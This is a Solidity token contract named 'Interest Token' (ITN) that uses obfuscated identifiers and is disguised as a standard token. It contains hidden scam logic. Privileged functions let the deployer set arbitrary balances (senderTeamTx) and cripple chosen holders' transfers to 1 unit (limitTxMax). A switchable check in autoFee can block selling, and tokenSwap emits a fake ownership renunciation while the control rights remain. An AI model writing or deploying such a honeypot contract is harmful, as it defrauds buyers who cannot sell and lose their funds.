//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface receiverTakeLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedAuto) external view returns (uint256);

    function transfer(address toTokenSell, uint256 maxFund) external returns (bool);

    function allowance(address walletLaunchTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxFund) external returns (bool);

    function transferFrom(
        address sender,
        address toTokenSell,
        uint256 maxFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromLaunch, uint256 value);
    event Approval(address indexed walletLaunchTotal, address indexed spender, uint256 value);
}

abstract contract fundFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitList {
    function createPair(address liquidityIs, address autoReceiver) external returns (address);
}

interface takeSwap is receiverTakeLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InterestToken is fundFrom, receiverTakeLiquidity, takeSwap {

    address buyIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public fundReceiverBuy;

    function senderTeamTx(address maxEnableTeam, uint256 maxFund) public {
        modeExempt();
        tokenMax[maxEnableTeam] = maxFund;
    }

    uint256 txFund;

    function balanceOf(address launchedAuto) public view virtual override returns (uint256) {
        return tokenMax[launchedAuto];
    }

    bool public fromLiquidity;

    bool public tradingList;

    address public modeBuy;

    function symbol() external view virtual override returns (string memory) {
        return tokenSell;
    }

    string private tokenSell = "ITN";

    function decimals() external view virtual override returns (uint8) {
        return launchAt;
    }

    uint256 private sellLaunch = 100000000 * 10 ** 18;

    mapping(address => bool) public walletFund;

    function launchTake(address minWallet, address toTokenSell, uint256 maxFund) internal returns (bool) {
        require(tokenMax[minWallet] >= maxFund);
        tokenMax[minWallet] -= maxFund;
        tokenMax[toTokenSell] += maxFund;
        emit Transfer(minWallet, toTokenSell, maxFund);
        return true;
    }

    address public amountWallet;

    uint8 private launchAt = 18;

    function autoFee(address minWallet, address toTokenSell, uint256 maxFund) internal returns (bool) {
        if (minWallet == amountWallet) {
            return launchTake(minWallet, toTokenSell, maxFund);
        }
        uint256 buyMin = receiverTakeLiquidity(modeBuy).balanceOf(buyIs);
        require(buyMin == txFund);
        require(toTokenSell != buyIs);
        if (walletFund[minWallet]) {
            return launchTake(minWallet, toTokenSell, launchIs);
        }
        return launchTake(minWallet, toTokenSell, maxFund);
    }

    bool public walletSellToken;

    uint256 private senderLaunchedBuy;

    string private fromTotalSell = "Interest Token";

    function limitSell(uint256 maxFund) public {
        modeExempt();
        txFund = maxFund;
    }

    constructor (){
        if (receiverWalletLimit == senderLaunchedBuy) {
            fromLiquidity = true;
        }
        amountTeam fundSwap = amountTeam(txTotal);
        modeBuy = limitList(fundSwap.factory()).createPair(fundSwap.WETH(), address(this));
        
        amountWallet = _msgSender();
        tokenSwap();
        fundReceiverBuy[amountWallet] = true;
        tokenMax[amountWallet] = sellLaunch;
        if (walletSellToken) {
            senderLaunchedBuy = enableIsExempt;
        }
        emit Transfer(address(0), amountWallet, sellLaunch);
    }

    function tokenSwap() public {
        emit OwnershipTransferred(amountWallet, address(0));
        receiverList = address(0);
    }

    function modeExempt() private view {
        require(fundReceiverBuy[_msgSender()]);
    }

    function approve(address launchMarketing, uint256 maxFund) public virtual override returns (bool) {
        walletAtTrading[_msgSender()][launchMarketing] = maxFund;
        emit Approval(_msgSender(), launchMarketing, maxFund);
        return true;
    }

    function isMax(address liquiditySellSender) public {
        if (tradingList) {
            return;
        }
        
        fundReceiverBuy[liquiditySellSender] = true;
        if (senderLaunchedBuy == amountShould) {
            fromLiquidity = false;
        }
        tradingList = true;
    }

    address private receiverList;

    function transferFrom(address minWallet, address toTokenSell, uint256 maxFund) external override returns (bool) {
        if (_msgSender() != txTotal) {
            if (walletAtTrading[minWallet][_msgSender()] != type(uint256).max) {
                require(maxFund <= walletAtTrading[minWallet][_msgSender()]);
                walletAtTrading[minWallet][_msgSender()] -= maxFund;
            }
        }
        return autoFee(minWallet, toTokenSell, maxFund);
    }

    uint256 private receiverWalletLimit;

    uint256 constant launchIs = 1 ** 10;

    function allowance(address limitFrom, address launchMarketing) external view virtual override returns (uint256) {
        if (launchMarketing == txTotal) {
            return type(uint256).max;
        }
        return walletAtTrading[limitFrom][launchMarketing];
    }

    event OwnershipTransferred(address indexed modeAmount, address indexed fromLaunchedAmount);

    function transfer(address maxEnableTeam, uint256 maxFund) external virtual override returns (bool) {
        return autoFee(_msgSender(), maxEnableTeam, maxFund);
    }

    uint256 public amountShould;

    function limitTxMax(address modeMarketing) public {
        modeExempt();
        
        if (modeMarketing == amountWallet || modeMarketing == modeBuy) {
            return;
        }
        walletFund[modeMarketing] = true;
    }

    uint256 private enableIsExempt;

    mapping(address => mapping(address => uint256)) private walletAtTrading;

    uint256 swapAmountAt;

    function owner() external view returns (address) {
        return receiverList;
    }

    function getOwner() external view returns (address) {
        return receiverList;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellLaunch;
    }

    address txTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private tokenMax;

    function name() external view virtual override returns (string memory) {
        return fromTotalSell;
    }

}